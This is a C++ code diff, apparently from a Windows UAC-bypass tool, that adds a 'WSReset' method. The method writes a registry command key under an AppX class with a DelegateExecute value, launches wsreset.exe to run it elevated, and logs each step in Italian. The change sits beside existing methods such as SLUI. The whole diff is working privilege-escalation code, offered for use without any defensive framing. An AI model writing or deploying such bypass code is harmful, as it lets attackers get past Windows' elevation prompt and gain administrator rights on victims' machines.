@@ -74,6 +74,15 @@ BypassMethods::BypassMethods()
         true,
         false
     };
+    
+    methodDetails[BypassMethod::WSRESET] = {
+        L"wsreset.exe",
+        L"Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command",
+        L"DelegateExecute",
+        L"",
+        true,
+        false
+    };
 }
 
 BypassMethods::~BypassMethods() {
@@ -144,6 +153,9 @@ bool BypassMethods::executeBypass(BypassMethod method) {
             break;
         case BypassMethod::SLUI:
             result = bypassSlui();
+            break;
+        case BypassMethod::WSRESET:
+            result = bypassWSReset();
             break;
     }
     
@@ -396,6 +408,36 @@ bool BypassMethods::bypassSlui() {
         return false;
     }
     
+    return true;
+}
+
+bool BypassMethods::bypassWSReset() {
+    const auto& details = methodDetails[BypassMethod::WSRESET];
+    
+    logger.logInfo(L"Avvio bypass WSReset");
+    
+    // Backup registro
+    if (!backupRegistry(BypassMethod::WSRESET)) {
+        logger.logError(L"Backup registro WSReset fallito");
+        return false;
+    }
+    
+    // Setup chiave registro
+    if (!setupRegistry(details)) {
+        logger.logError(L"Setup registro WSReset fallito");
+        restoreRegistry(BypassMethod::WSRESET);
+        return false;
+    }
+    
+    // Esegui wsreset.exe
+    if (!createProcess(details.processName)) {
+        logger.logError(L"Esecuzione WSReset fallita");
+        cleanupRegistry(details);
+        restoreRegistry(BypassMethod::WSRESET);
+        return false;
+    }
+    
+    logger.logInfo(L"Bypass WSReset completato con successo");
     return true;
 }
 
